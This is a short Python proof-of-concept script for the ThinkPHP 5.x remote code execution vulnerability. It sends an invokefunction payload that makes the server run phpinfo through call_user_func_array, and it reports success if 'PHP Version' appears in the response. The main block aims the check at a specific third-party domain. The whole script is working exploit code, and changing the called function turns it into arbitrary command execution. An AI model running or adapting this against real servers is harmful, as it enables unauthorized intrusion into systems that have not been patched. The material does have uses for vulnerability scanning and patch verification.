# /usr/bin/env python
# -*- coding:utf-8 -*-
# https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815
# https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection
# 5.x < 5.1.31
# 5.x < 5.0.23


import requests


class Exploit(object):

    @classmethod
    def poc(cls, url):
        payload = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
        r = requests.get(url + payload)
        return 'PHP Version' in r.text


if __name__ == '__main__':
    print(Exploit.poc('http://www.apple.zwios.cn'))
